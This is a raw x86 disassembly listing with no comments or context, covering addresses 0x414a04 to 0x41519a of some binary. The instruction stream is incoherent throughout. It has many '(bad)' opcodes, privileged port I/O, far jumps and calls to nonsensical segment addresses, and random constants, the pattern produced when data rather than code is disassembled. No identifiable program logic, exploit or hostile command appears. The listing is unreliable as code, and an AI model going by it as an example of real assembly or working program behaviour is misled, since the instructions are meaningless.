  414a04:	xchg   DWORD PTR [eax-0x4ac0683d],esp
  414a0a:	sub    ebp,edx
  414a0c:	xchg   esi,eax
  414a0d:	pop    ecx
  414a0e:	dec    ebx
  414a0f:	leave  
  414a10:	mov    ebp,0xb9a188a1
  414a15:	xor    eax,0x8b4fece9
  414a1a:	les    ebx,FWORD PTR [edi-0x38]
  414a1d:	scas   eax,DWORD PTR es:[edi]
  414a1e:	push   edi
  414a1f:	cwde   
  414a20:	hlt    
  414a21:	jmp    0x16cf7519
  414a26:	xor    bl,BYTE PTR [eax]
  414a28:	les    ecx,FWORD PTR [esp+ebx*8+0x70]
  414a2c:	inc    eax
  414a2d:	aas    
  414a2e:	xor    BYTE PTR [eax-0x36],al
  414a31:	add    ah,BYTE PTR [edi+0x71]
  414a34:	call   0x41f9:0xf84d4073
  414a3b:	xor    DWORD PTR [ebx-0x1f],0x6e
  414a3f:	aad    0x55
  414a41:	inc    esi
  414a42:	pop    esi
  414a43:	sbb    BYTE PTR [edx-0x63],al
  414a46:	sbb    esp,DWORD PTR [edx+edi*8+0x7d7ff08a]
  414a4d:	sbb    ch,0x78
  414a50:	inc    ebp
  414a51:	lods   al,BYTE PTR ds:[esi]
  414a52:	data16 add BYTE PTR [ebp+0x17],0xd
  414a57:	mov    al,ds:0x203b75ea
  414a5c:	vmwrite ebx,DWORD PTR [ebp-0x16]
  414a60:	dec    edx
  414a61:	jno    0x414a60
  414a63:	rcr    DWORD PTR [esi-0x6c],1
  414a66:	shl    BYTE PTR [eax+edx*8],cl
  414a69:	fadd   QWORD PTR [ebx-0x5a]
  414a6c:	sbb    al,0xd9
  414a6e:	outs   dx,BYTE PTR ds:[esi]
  414a6f:	ss dec ebp
  414a71:	mov    al,0xfb
  414a73:	dec    esi
  414a74:	dec    ebp
  414a75:	mov    dl,BYTE PTR [eax-0x4a]
  414a78:	inc    edx
  414a79:	leave  
  414a7a:	mov    esi,0x3b651fc3
  414a7f:	xchg   edi,eax
  414a80:	cmp    BYTE PTR [eax],dl
  414a82:	out    0xe5,al
  414a84:	je     0x414aaa
  414a86:	mov    al,ds:0x2dd94a41
  414a8b:	lea    edx,[edx]
  414a8d:	lods   eax,DWORD PTR ds:[esi]
  414a8e:	(bad)  
  414a8f:	fnstenv [ebp+0x42]
  414a92:	dec    ebp
  414a93:	or     DWORD PTR [edx-0xf06f11],ebx
  414a99:	outs   dx,DWORD PTR ds:[esi]
  414a9a:	adc    al,0xea
  414a9c:	dec    esp
  414a9d:	lds    ecx,FWORD PTR [ecx-0x35]
  414aa0:	sub    al,0x6a
  414aa2:	call   0x2fbda88a
  414aa7:	leave  
  414aa8:	test   al,0xd7
  414aaa:	popf   
  414aab:	cmp    edx,DWORD PTR [esi]
  414aad:	hlt    
  414aae:	push   esi
  414aaf:	fldenv [ecx+0x68]
  414ab2:	xchg   ebp,eax
  414ab3:	or     edx,DWORD PTR [ebx+edx*1-0x45]
  414ab7:	jl     0x414a42
  414ab9:	cmp    eax,0x1ad39802
  414abe:	push   edi
  414abf:	les    esp,FWORD PTR [ebx]
  414ac1:	mov    DWORD PTR [esi],edi
  414ac3:	push   ecx
  414ac4:	mov    eax,ds:0x6805e81
  414ac9:	sub    BYTE PTR [ebx],0x94
  414acc:	retf   
  414acd:	push   eax
  414ace:	push   esp
  414acf:	int3   
  414ad0:	fyl2xp1 
  414ad2:	push   ss
  414ad3:	imul   esp,DWORD PTR [esp+eiz*2+0x64],0xe924d87d
  414adb:	or     edx,DWORD PTR [esi]
  414add:	mov    bh,0xcd
  414adf:	jne    0x414b3d
  414ae1:	cmp    al,0x14
  414ae3:	in     al,0xd3
  414ae5:	jl     0x414b1b
  414ae7:	fmul   DWORD PTR [ecx]
  414ae9:	rol    BYTE PTR [ecx-0x6f],cl
  414aec:	rcl    DWORD PTR [esi],cl
  414aee:	not    DWORD PTR [eax]
  414af0:	(bad)  
  414af1:	fcom   QWORD PTR [ecx+0x4a]
  414af4:	dec    ecx
  414af5:	(bad)  
  414af6:	push   edx
  414af7:	mov    al,ch
  414af9:	into   
  414afa:	mov    edx,0x1f221b30
  414aff:	cmp    DWORD PTR [edi+ebp*4-0x71],ebx
  414b03:	fdivr  QWORD PTR [eax+0x59]
  414b06:	arpl   dx,si
  414b08:	es out dx,al
  414b0a:	in     al,0xa0
  414b0c:	push   cs
  414b0d:	jne    0x414b02
  414b0f:	int3   
  414b10:	xchg   ebp,eax
  414b11:	pop    ebp
  414b12:	adc    BYTE PTR fs:[edi+0x5c],ah
  414b16:	and    al,BYTE PTR [ebx+0x53873308]
  414b1c:	lods   al,BYTE PTR ds:[esi]
  414b1d:	push   edx
  414b1e:	inc    esi
  414b1f:	inc    ebp
  414b20:	or     al,0x45
  414b22:	mov    al,ds:0x3e30d923
  414b27:	leave  
  414b28:	mov    ds:0x3a158b5d,al
  414b2d:	clc    
  414b2e:	add    dl,ah
  414b30:	and    al,0x34
  414b32:	into   
  414b33:	cs retw 0x821b
  414b38:	out    dx,al
  414b39:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414b3b:	(bad)  {k6}
  414b40:	(bad)  
  414b41:	rol    BYTE PTR [edi],cl
  414b43:	in     al,0x6a
  414b45:	pop    eax
  414b46:	in     eax,0xc1
  414b48:	cmp    al,0x78
  414b4a:	dec    edx
  414b4b:	ret    0xb9c
  414b4e:	pushf  
  414b4f:	xchg   esi,eax
  414b50:	fsub   QWORD PTR [ebp+0x17831b82]
  414b56:	cli    
  414b57:	inc    ebp
  414b58:	cmp    eax,0x47c0cb6
  414b5d:	rcl    DWORD PTR [esp+edx*1-0x72f8140b],0x3f
  414b65:	push   esp
  414b66:	pop    ebp
  414b67:	mov    ebp,0xaff5e4a5
  414b6c:	mov    dl,0x37
  414b6e:	push   esp
  414b6f:	xor    bh,dh
  414b71:	out    0x7,al
  414b73:	add    ecx,DWORD PTR [esi-0x4a17b3ac]
  414b79:	fisubr WORD PTR [edx+ebp*8+0x6331e8c]
  414b80:	xor    ebp,DWORD PTR [edi+0xceb5edb]
  414b86:	inc    eax
  414b87:	out    0x6e,al
  414b89:	js     0x414b80
  414b8b:	enter  0x3132,0x22
  414b8f:	xchg   esi,eax
  414b90:	xlat   BYTE PTR ds:[ebx]
  414b91:	jne    0x414c0b
  414b93:	pop    edx
  414b94:	gs inc edx
  414b96:	pop    esp
  414b97:	dec    edi
  414b98:	pop    ds
  414b99:	add    eax,0xda22aa23
  414b9e:	push   ebp
  414b9f:	jno    0x414c03
  414ba1:	cld    
  414ba2:	fnstsw WORD PTR [ecx+0x6d244dd6]
  414ba8:	shl    DWORD PTR [esi+0x1d9b9a1f],cl
  414bae:	mov    BYTE PTR [ecx+eax*1+0xd],bl
  414bb2:	popf   
  414bb3:	and    BYTE PTR [edi],al
  414bb5:	pop    edi
  414bb6:	fsub   DWORD PTR [eax]
  414bb8:	es push es
  414bba:	in     eax,0xa4
  414bbc:	lahf   
  414bbd:	arpl   bx,cx
  414bbf:	mov    eax,ds:0xe9d4a4f6
  414bc4:	cmp    esp,edi
  414bc6:	popa   
  414bc7:	scas   al,BYTE PTR es:[edi]
  414bc8:	mov    ch,0x97
  414bca:	xor    BYTE PTR [ebx],dl
  414bcc:	lods   al,BYTE PTR ds:[esi]
  414bcd:	inc    edx
  414bce:	sbb    eax,DWORD PTR [ecx-0x6d]
  414bd1:	mov    ah,BYTE PTR [ecx+0x6]
  414bd4:	jne    0x414c40
  414bd6:	pushf  
  414bd7:	enter  0xbc38,0xc8
  414bdb:	mov    edx,0x9ed59c90
  414be0:	sbb    dl,cl
  414be2:	dec    esp
  414be3:	adc    al,0x4c
  414be5:	sub    BYTE PTR [ebx+0x383f8eb],al
  414beb:	sub    dl,BYTE PTR [eax-0x60d1f6f1]
  414bf1:	scas   eax,DWORD PTR es:[edi]
  414bf2:	sbb    al,0xec
  414bf4:	push   ebp
  414bf5:	popf   
  414bf6:	push   0xfffffff6
  414bf8:	mov    al,0xdd
  414bfa:	mov    DWORD PTR [edi-0x7b28fc33],ecx
  414c00:	test   BYTE PTR [esi+0x7a],al
  414c03:	fadd   DWORD PTR [edi+0x3c3a7ee1]
  414c09:	jnp    0x414c50
  414c0b:	pop    ebx
  414c0c:	rcr    BYTE PTR [eax+0x5a438315],1
  414c12:	pop    edx
  414c13:	cmc    
  414c14:	(bad)  
  414c16:	xchg   DWORD PTR [ebx+0x33],esi
  414c19:	pushf  
  414c1a:	jg     0x414c9b
  414c1c:	add    BYTE PTR ds:0xf4fa2929,cl
  414c22:	push   ecx
  414c23:	iret   
  414c24:	mov    dh,BYTE PTR [ebp+0x68353402]
  414c2a:	push   ecx
  414c2b:	mov    ch,0x4a
  414c2d:	cmp    BYTE PTR [ebx+0x0],dh
  414c30:	mov    dh,0x1d
  414c32:	pop    ecx
  414c33:	vpsubusw xmm6,xmm3,XMMWORD PTR [ecx-0x29]
  414c38:	push   0xeb6aff05
  414c3d:	jb     0x414c50
  414c3f:	push   esp
  414c40:	icebp  
  414c41:	jmp    0x9cd8:0x887546ef
  414c48:	jmp    0x67e25f5d
  414c4d:	aas    
  414c4e:	add    edx,DWORD PTR [edx-0x1d]
  414c51:	inc    edx
  414c52:	dec    ecx
  414c53:	xor    eax,0x8ca68844
  414c58:	in     al,0x98
  414c5a:	sub    cl,ah
  414c5c:	xor    BYTE PTR [ebx-0x300ccb3b],0x34
  414c63:	mov    es,ebx
  414c65:	cli    
  414c66:	lock outs dx,DWORD PTR ds:[esi]
  414c68:	push   ecx
  414c69:	mov    esi,0xd91241c6
  414c6e:	pop    esp
  414c6f:	mov    cl,0x2d
  414c71:	push   esi
  414c72:	and    al,0x39
  414c74:	jnp    0x414c1b
  414c76:	aas    
  414c77:	mov    eax,cs
  414c79:	imul   edi,esp,0x7c
  414c7c:	adc    dl,BYTE PTR [ecx-0x40]
  414c7f:	xchg   esi,eax
  414c80:	or     eax,0x38c38620
  414c85:	pop    edi
  414c86:	xchg   edx,eax
  414c87:	sbb    ebp,ecx
  414c89:	jo     0x414cdc
  414c8b:	sahf   
  414c8c:	pop    ecx
  414c8d:	push   ebp
  414c8e:	rol    BYTE PTR [ecx+0x2c],1
  414c91:	leave  
  414c92:	cmp    al,0xb2
  414c94:	imul   edi,DWORD PTR [eax+0xa],0x49
  414c98:	mov    cl,0x1e
  414c9a:	add    BYTE PTR [eax+0x3ec31306],al
  414ca0:	push   esp
  414ca1:	cmp    DWORD PTR [eax+0x27777911],edi
  414ca7:	cli    
  414ca8:	push   es
  414ca9:	xor    al,0xb9
  414cab:	icebp  
  414cac:	out    dx,al
  414cad:	(bad)  
  414caf:	jge    0x414c31
  414cb1:	inc    esp
  414cb2:	cdq    
  414cb3:	xor    BYTE PTR [ebx+0x6f],0x58
  414cb7:	clc    
  414cb8:	mov    esi,0x7216fe20
  414cbd:	iret   
  414cbe:	add    al,0x33
  414cc0:	mov    edx,0xf2c51477
  414cc5:	ja     0x414cbd
  414cc7:	mov    esi,0xeb606cb3
  414ccc:	jnp    0x414c5d
  414cce:	aad    0x2b
  414cd0:	sti    
  414cd1:	clc    
  414cd2:	dec    esi
  414cd3:	push   ebp
  414cd4:	retf   0x2f37
  414cd7:	cmp    bh,BYTE PTR [edx-0x47ef2b7b]
  414cdd:	fwait
  414cde:	pop    edi
  414cdf:	mov    eax,ds:0x4c5e0094
  414ce4:	jg     0x414d5b
  414ce6:	jbe    0x414d02
  414ce8:	ja     0x414cd8
  414cea:	cmp    al,0x1e
  414cec:	pop    eax
  414ced:	sub    al,dh
  414cef:	fdivrp st(5),st
  414cf1:	sti    
  414cf2:	mov    esp,0xbeb79453
  414cf7:	cmp    eax,0x11b20f4c
  414cfc:	and    esp,ebp
  414cfe:	in     al,dx
  414cff:	jae    0x414d31
  414d01:	xchg   esp,eax
  414d02:	pop    esp
  414d03:	pop    esi
  414d04:	xchg   ecx,eax
  414d05:	fistp  DWORD PTR [edi-0x7f4177a3]
  414d0b:	(bad)  
  414d0c:	adc    dh,BYTE PTR fs:[bp+si]
  414d10:	sbb    dh,BYTE PTR [ebx-0x7e]
  414d13:	jmp    0x414ca8
  414d15:	dec    esp
  414d16:	(bad)  
  414d17:	(bad)  
  414d18:	retf   0x2b14
  414d1b:	dec    esp
  414d1c:	fucomp st(0)
  414d1e:	mov    bl,0x1f
  414d20:	pop    ecx
  414d21:	xor    eax,ebp
  414d23:	scas   al,BYTE PTR es:[edi]
  414d24:	(bad)  
  414d25:	sti    
  414d26:	pop    ss
  414d27:	ret    0xb688
  414d2a:	or     ah,BYTE PTR [edi+0x37]
  414d2d:	fistp  DWORD PTR [esi-0x38]
  414d30:	(bad)  
  414d31:	cmc    
  414d32:	and    BYTE PTR [edx+esi*2-0x3b40609d],ch
  414d39:	shl    DWORD PTR [eax-0x3f10b450],cl
  414d3f:	add    DWORD PTR [ebp-0x7431355d],esi
  414d45:	lds    eax,FWORD PTR [eax]
  414d47:	out    dx,al
  414d48:	inc    esp
  414d49:	cmp    DWORD PTR [eax+edx*2-0x6],0x20ad930b
  414d51:	test   BYTE PTR ds:0xcb4e95fb,bl
  414d57:	and    DWORD PTR [ebx],ecx
  414d59:	push   cs
  414d5a:	fisubr DWORD PTR [ebx-0x32]
  414d5d:	mov    ds,WORD PTR [eax-0x677d535c]
  414d63:	and    al,BYTE PTR [ebp-0x66]
  414d66:	inc    ebx
  414d67:	xor    dl,bh
  414d69:	fst    DWORD PTR [esi+0xf32f24]
  414d6f:	cmp    ebx,DWORD PTR [edx+0x13]
  414d72:	ins    DWORD PTR es:[edi],dx
  414d73:	xchg   ecx,eax
  414d74:	pushf  
  414d75:	or     bl,0x1d
  414d78:	sbb    al,BYTE PTR ds:[esi-0x5e]
  414d7c:	stos   DWORD PTR es:[edi],eax
  414d7d:	aas    
  414d7e:	inc    eax
  414d7f:	leave  
  414d80:	jle    0x414dd6
  414d82:	add    DWORD PTR fs:[ecx-0xa785ec4],ebx
  414d89:	add    BYTE PTR [esi+0x113a1dd6],0x5c
  414d90:	pop    ecx
  414d91:	sbb    dh,al
  414d93:	pop    es
  414d94:	dec    esi
  414d95:	jnp    0x414d65
  414d97:	iret   
  414d98:	scas   al,BYTE PTR es:[edi]
  414d99:	jp     0x414dc1
  414d9b:	cmp    eax,0xba521afe
  414da0:	pop    esi
  414da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414da2:	lock (bad) 
  414da4:	cmp    BYTE PTR [esi+esi*2-0x6f],dh
  414da8:	repz adc ah,dh
  414dab:	inc    ebp
  414dac:	inc    esi
  414dad:	or     al,0xbe
  414daf:	mov    bl,0xc7
  414db1:	repnz fcom QWORD PTR [ebx+0x10]
  414db5:	fldcw  WORD PTR [ecx+0x34ea07ba]
  414dbb:	dec    eax
  414dbc:	xchg   DWORD PTR [ecx+0x23],edx
  414dbf:	pop    ecx
  414dc0:	mov    al,0x6b
  414dc2:	push   0x1b
  414dc4:	mov    al,0xf8
  414dc6:	xchg   edx,eax
  414dc7:	lea    ebx,[eax+0x5c2cad07]
  414dcd:	aas    
  414dce:	nop
  414dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd0:	leave  
  414dd1:	jb     0x414e24
  414dd3:	adc    dh,ch
  414dd5:	popf   
  414dd6:	xchg   ebp,eax
  414dd7:	sar    esi,0x73
  414dda:	jge    0x414e06
  414ddc:	fistp  QWORD PTR [eax+0x28]
  414ddf:	aad    0xc5
  414de1:	fistp  DWORD PTR [eax]
  414de3:	icebp  
  414de4:	push   ds
  414de5:	add    al,0xfe
  414de7:	pop    ds
  414de8:	lahf   
  414de9:	xlat   BYTE PTR ds:[ebx]
  414dea:	xchg   esi,eax
  414deb:	cwde   
  414dec:	jle    0x414e05
  414dee:	sbb    BYTE PTR [esi-0xe],0xe6
  414df2:	push   eax
  414df3:	loope  0x414dd9
  414df5:	sub    al,cl
  414df7:	sbb    BYTE PTR [edx-0x78d94aa8],cl
  414dfd:	mov    esi,0x7da2e8f7
  414e02:	mov    esp,0x2be1d91a
  414e07:	lahf   
  414e08:	mov    bh,0x24
  414e0a:	pop    esi
  414e0b:	mov    bl,0x28
  414e0d:	inc    edi
  414e0e:	addr16 aaa 
  414e10:	push   esp
  414e11:	fdiv   QWORD PTR [esi]
  414e13:	mov    ebx,DWORD PTR ds:0x3af6a72c
  414e19:	xchg   esi,eax
  414e1a:	icebp  
  414e1b:	call   0x817d:0x2854cf05
  414e22:	adc    al,0x3a
  414e24:	xchg   edi,eax
  414e25:	xchg   edi,eax
  414e26:	sbb    ch,BYTE PTR [eax-0xd]
  414e29:	xor    BYTE PTR [edi-0x74bd23f7],ah
  414e2f:	les    ebp,FWORD PTR [esi+0x5d]
  414e32:	jp     0x414e56
  414e34:	test   eax,0x69b9eba1
  414e39:	or     edi,DWORD PTR [ebp+esi*1+0x2098c6de]
  414e40:	fs mov dh,0x16
  414e43:	leave  
  414e44:	outs   dx,BYTE PTR ds:[esi]
  414e45:	xchg   edi,eax
  414e46:	(bad)  
  414e47:	lods   al,BYTE PTR ds:[esi]
  414e48:	inc    ebx
  414e49:	not    BYTE PTR [eax]
  414e4b:	out    dx,eax
  414e4c:	daa    
  414e4d:	lods   al,BYTE PTR ds:[esi]
  414e4e:	mov    BYTE PTR [esi],bh
  414e50:	push   esi
  414e51:	dec    eax
  414e52:	enter  0x3004,0xe8
  414e56:	pop    eax
  414e57:	xchg   BYTE PTR [edx-0x42],bl
  414e5a:	ins    DWORD PTR es:[edi],dx
  414e5b:	cli    
  414e5c:	mov    esi,0xaab8d09f
  414e61:	push   ebp
  414e62:	jo     0x414eba
  414e64:	xchg   BYTE PTR [ebx+0x9d8e3a5],bh
  414e6a:	push   eax
  414e6b:	hlt    
  414e6c:	xchg   BYTE PTR [edi+eiz*1],ah
  414e6f:	push   ebx
  414e70:	out    0x3f,al
  414e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e73:	shl    al,cl
  414e75:	ret    
  414e76:	fiadd  WORD PTR [eax*2-0x266f953f]
  414e7d:	clc    
  414e7e:	fucomip st,st(2)
  414e80:	jae    0x414eec
  414e82:	xor    edx,ebx
  414e84:	sbb    BYTE PTR ds:0x630690bc,ah
  414e8a:	mov    ah,0xe6
  414e8c:	xor    eax,DWORD PTR [ebx+0x30e8ad9b]
  414e92:	(bad)  
  414e94:	pop    esp
  414e95:	sahf   
  414e96:	and    BYTE PTR [ecx-0x516a5be6],0x1a
  414e9d:	and    al,0x87
  414e9f:	pushf  
  414ea0:	jle    0x414e9d
  414ea2:	sbb    BYTE PTR [esi],dl
  414ea4:	pop    ss
  414ea5:	out    0x52,al
  414ea7:	mov    al,ds:0xad7236be
  414eac:	push   es
  414ead:	pop    edx
  414eae:	(bad)  
  414eaf:	mov    al,0xef
  414eb1:	in     eax,dx
  414eb2:	mov    ah,0xe7
  414eb4:	test   DWORD PTR [edx],edi
  414eb6:	out    0x7b,al
  414eb8:	jmp    0x89a6:0xc0ff52a7
  414ebf:	adc    bh,BYTE PTR [ebp-0x6254fb76]
  414ec5:	jp     0x414f13
  414ec7:	adc    al,0x52
  414ec9:	mov    bh,0x60
  414ecb:	cmp    ch,BYTE PTR [eax-0x9]
  414ece:	dec    eax
  414ecf:	cmp    eax,0x1d96b406
  414ed4:	retf   
  414ed5:	jns    0x414f36
  414ed7:	popf   
  414ed8:	sbb    DWORD PTR [ebx+0x32],ecx
  414edb:	data16 jns 0x414ee9
  414ede:	(bad)  
  414edf:	data16 xchg BYTE PTR [eax+edx*2+0x45545f84],bl
  414ee7:	push   cs
  414ee8:	dec    edx
  414ee9:	or     cl,BYTE PTR [edi+0x773c70ba]
  414eef:	imul   ebx
  414ef1:	stos   DWORD PTR es:[edi],eax
  414ef2:	jns    0x414e87
  414ef4:	sbb    bh,BYTE PTR [edx+0x5cebc878]
  414efa:	mov    cl,0x5e
  414efc:	fsubrp st(6),st
  414efe:	mov    ecx,0xb8db1b2b
  414f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f04:	cmp    eax,0x8a898d90
  414f09:	and    esi,DWORD PTR [edx-0x3bc570f6]
  414f0f:	mov    esi,0xffac24bf
  414f14:	pop    ecx
  414f15:	adc    al,0x30
  414f17:	mov    ah,0x30
  414f19:	push   esp
  414f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1b:	mov    al,ds:0x5d6d0272
  414f20:	retf   
  414f21:	sahf   
  414f22:	sbb    al,0x1b
  414f24:	cmp    bh,BYTE PTR [eax-0x548a0c3e]
  414f2a:	test   eax,esi
  414f2c:	ret    
  414f2d:	scas   eax,DWORD PTR es:[edi]
  414f2e:	push   esp
  414f2f:	dec    eax
  414f30:	pushf  
  414f31:	pop    ebp
  414f32:	or     al,0x85
  414f34:	mov    al,0x3e
  414f36:	sub    al,0x87
  414f38:	adc    ebx,eax
  414f3a:	stc    
  414f3b:	mov    ebp,0xff6c311d
  414f40:	retf   
  414f41:	push   ecx
  414f42:	lods   eax,DWORD PTR ds:[esi]
  414f43:	xchg   ecx,ecx
  414f45:	jmp    0x39c0:0x6060e617
  414f4c:	rcr    ah,1
  414f4e:	jl     0x414f73
  414f50:	xchg   esi,eax
  414f51:	pop    eax
  414f52:	mov    esi,0x3f7d4e38
  414f57:	les    ecx,FWORD PTR [esi+0x5]
  414f5a:	fwait
  414f5b:	bound  esi,QWORD PTR [ebx+0x7b718246]
  414f61:	mov    DWORD PTR [ecx+0x5268b850],ebx
  414f67:	ja     0x414f47
  414f69:	pop    esi
  414f6a:	icebp  
  414f6b:	pop    edi
  414f6c:	xchg   ebx,eax
  414f6d:	out    dx,al
  414f6e:	daa    
  414f6f:	jecxz  0x414f55
  414f71:	call   0x4ca993ce
  414f76:	push   ebx
  414f77:	shr    DWORD PTR [ecx],cl
  414f79:	jg     0x414f7c
  414f7b:	adc    BYTE PTR [eax+0x1d],cl
  414f7e:	or     eax,0xc6b4f886
  414f83:	loope  0x414f94
  414f85:	cmp    edi,esp
  414f87:	adc    edi,DWORD PTR [edi-0x60]
  414f8a:	inc    esp
  414f8b:	hlt    
  414f8c:	sti    
  414f8d:	ror    DWORD PTR [ebp+0x2f],cl
  414f90:	ins    BYTE PTR es:[edi],dx
  414f91:	addr16 popf 
  414f93:	lods   eax,DWORD PTR ds:[esi]
  414f94:	pop    ebp
  414f95:	std    
  414f96:	xor    DWORD PTR [edi-0x63],0x16bb2ff0
  414f9d:	inc    edx
  414f9e:	sqrtps xmm1,XMMWORD PTR ds:0xc8b96a7d
  414fa5:	(bad)  
  414fa6:	jnp    0x414fca
  414fa8:	shl    bl,1
  414faa:	mov    ecx,0x7336ec33
  414faf:	mov    DWORD PTR [eax-0x1adcaf3b],ecx
  414fb5:	aam    0xb1
  414fb7:	ret    0xcd0b
  414fba:	xor    al,0x67
  414fbc:	jge    0x414f79
  414fbe:	mov    al,0x30
  414fc0:	cmp    edi,DWORD PTR [eax+0x56]
  414fc3:	cmp    ecx,ecx
  414fc5:	dec    edx
  414fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc7:	pushf  
  414fc8:	xor    BYTE PTR [edi-0x48],al
  414fcb:	adc    al,0xfa
  414fcd:	cmp    eax,0x7b5dbba1
  414fd2:	jp     0x414f91
  414fd4:	sub    al,0x2d
  414fd6:	cwde   
  414fd7:	inc    ebx
  414fd8:	pop    ss
  414fd9:	(bad)  
  414fdb:	adc    edx,DWORD PTR [edx]
  414fdd:	jmp    0xcf7c:0xcc463a56
  414fe4:	popa   
  414fe5:	jae    0x414fc3
  414fe7:	ss push es
  414fe9:	lds    eax,FWORD PTR [esp+edx*4+0x15a4fde4]
  414ff0:	cmp    edx,DWORD PTR [edx+0x27464b21]
  414ff6:	xchg   esi,eax
  414ff7:	mov    eax,ds:0x6e964c14
  414ffc:	jnp    0x414fa1
  414ffe:	adc    ebx,ebp
  415000:	xchg   edx,eax
  415001:	sbb    dl,0xea
  415004:	cli    
  415005:	inc    ebx
  415006:	clc    
  415007:	mov    ah,0xfd
  415009:	cmp    bl,BYTE PTR [ebx]
  41500b:	xchg   edx,eax
  41500c:	push   ebp
  41500d:	cmp    DWORD PTR [ebx+0x6e15145a],0x2c12ddd3
  415017:	xor    eax,0xafb3da40
  41501c:	cmp    DWORD PTR [ebp-0xc],0x3
  415020:	xchg   ebx,eax
  415021:	out    dx,al
  415022:	stos   DWORD PTR es:[edi],eax
  415023:	pop    edx
  415024:	inc    ebp
  415025:	ret    0x8532
  415028:	ss pop ss
  41502a:	xor    BYTE PTR [eax-0x56],dl
  41502d:	mov    ebp,0x2dae2e4f
  415032:	xchg   edi,ebp
  415034:	inc    ebp
  415035:	jl     0x4150ab
  415037:	fs xor al,0xfc
  41503a:	sub    eax,0x8de2fe04
  41503f:	call   0x7c9317b6
  415044:	xor    DWORD PTR [esi+0x72],0xffffff84
  415048:	mov    ah,0xae
  41504a:	jmp    0x30e7:0xc7d03afd
  415051:	mov    eax,ds:0x235688d9
  415056:	mov    ecx,0xd9829db3
  41505b:	add    al,dl
  41505d:	jbe    0x415053
  41505f:	mov    DWORD PTR ss:[eax],ecx
  415062:	les    esi,FWORD PTR [esi-0x6caad481]
  415068:	ja     0x4150db
  41506a:	add    bl,bh
  41506c:	out    dx,eax
  41506d:	hlt    
  41506e:	and    ebx,esi
  415070:	loop   0x415069
  415072:	ficomp WORD PTR [ebx+0x24994430]
  415078:	ss shl ch,cl
  41507b:	add    DWORD PTR [esi],esi
  41507d:	daa    
  41507e:	xor    esi,esp
  415080:	push   ss
  415081:	xchg   DWORD PTR [esp+ebp*1],ecx
  415084:	pop    ecx
  415085:	sub    esp,DWORD PTR [edi+0x7e941fb6]
  41508b:	and    DWORD PTR [edi+0x3d],ecx
  41508e:	lods   eax,DWORD PTR ds:[esi]
  41508f:	loopne 0x4150fb
  415091:	dec    ebp
  415092:	shl    BYTE PTR [eax+edi*2-0x7d463fc3],cl
  415099:	imul   esp,DWORD PTR [ebp+0x5e],0xffffffc1
  41509d:	rcr    bl,cl
  41509f:	and    eax,0xf31eeaf7
  4150a4:	sbb    dl,al
  4150a6:	test   edx,0x21765541
  4150ac:	int3   
  4150ad:	sahf   
  4150ae:	or     DWORD PTR [ebx],ebp
  4150b0:	inc    ecx
  4150b1:	iret   
  4150b2:	xchg   ebp,eax
  4150b3:	push   edx
  4150b4:	push   ebx
  4150b5:	inc    ebx
  4150b6:	out    dx,al
  4150b7:	mov    edi,0xea28a25
  4150bc:	sbb    bh,bh
  4150be:	stos   BYTE PTR es:[edi],al
  4150bf:	push   esi
  4150c0:	push   edi
  4150c1:	and    al,0xc2
  4150c3:	sub    edi,0x27
  4150c6:	push   0xffffffae
  4150c8:	loope  0x4150a2
  4150ca:	jp     0x415056
  4150cc:	mov    eax,0x41293ee9
  4150d1:	rcl    DWORD PTR [esi+0x6b],cl
  4150d4:	mov    edi,0xc1397a1
  4150d9:	cmp    ebx,DWORD PTR [edx]
  4150db:	iret   
  4150dc:	retf   0x94a8
  4150df:	fldlg2 
  4150e1:	aam    0xec
  4150e3:	and    BYTE PTR [edx],cl
  4150e5:	les    eax,FWORD PTR [ecx+0x6234539a]
  4150eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ec:	sub    al,0x19
  4150ee:	popa   
  4150ef:	mov    ebp,0x7eda1591
  4150f4:	outs   dx,DWORD PTR ds:[esi]
  4150f5:	cwde   
  4150f6:	xchg   ebp,eax
  4150f7:	aam    0x75
  4150f9:	outs   dx,DWORD PTR ds:[esi]
  4150fa:	dec    ebx
  4150fb:	bnd js 0x4150d5
  4150fe:	xor    eax,0xb7f1d337
  415103:	dec    edx
  415104:	mov    dl,0xfc
  415106:	aas    
  415107:	dec    edi
  415108:	enter  0x1c8b,0x72
  41510c:	cwde   
  41510d:	xor    eax,0x71aa56e4
  415112:	mov    WORD PTR [edx+0x5b],ss
  415115:	mov    al,ds:0x5dbd42d6
  41511a:	out    0x2d,eax
  41511c:	mov    bh,0xfd
  41511e:	xchg   DWORD PTR [eax+0x20dd554c],edx
  415124:	xchg   ebx,eax
  415125:	dec    ecx
  415126:	or     DWORD PTR [eax+0x5886c765],esi
  41512c:	rcl    edi,1
  41512e:	push   ecx
  41512f:	jp     0x415110
  415131:	hlt    
  415132:	rol    DWORD PTR [edi],cl
  415134:	mov    ebp,0xe20be522
  415139:	fucom  st(4)
  41513b:	shr    BYTE PTR [eax],1
  41513d:	test   al,0x73
  41513f:	or     BYTE PTR [ebp-0x35ac9d31],al
  415145:	je     0x415162
  415147:	sbb    BYTE PTR [edx-0x54],bh
  41514a:	pop    edi
  41514b:	sbb    eax,0xa813ad9f
  415150:	mov    edi,0x781b92a
  415155:	int3   
  415156:	mov    ch,0x3d
  415158:	mov    BYTE PTR [ebx-0x27a188a],0x9e
  41515f:	xchg   BYTE PTR fs:[eax],cl
  415162:	mov    ah,0x4e
  415164:	add    DWORD PTR [eax-0x48],0xffffffce
  415168:	test   BYTE PTR ds:[ebp-0x4],dl
  41516c:	stos   DWORD PTR es:[edi],eax
  41516d:	cmc    
  41516e:	pop    ebp
  41516f:	daa    
  415170:	outs   dx,BYTE PTR ds:[esi]
  415171:	or     dl,bl
  415173:	mov    bl,0x61
  415175:	(bad)  
  415176:	mov    ecx,0xf4729b8
  41517b:	sbb    eax,0x210e8315
  415180:	mov    edx,0x97976a7
  415185:	jae    0x4151f2
  415187:	mov    cl,0x32
  415189:	(bad)  
  41518a:	int3   
  41518b:	in     eax,0x62
  41518d:	push   ebx
  41518e:	mov    ah,0x44
  415190:	push   edx
  415191:	jmp    0x4151be
  415193:	call   0x378f:0xe398e963
  41519a:	adc    BYTE PTR [esi-0x2be0504d],cl
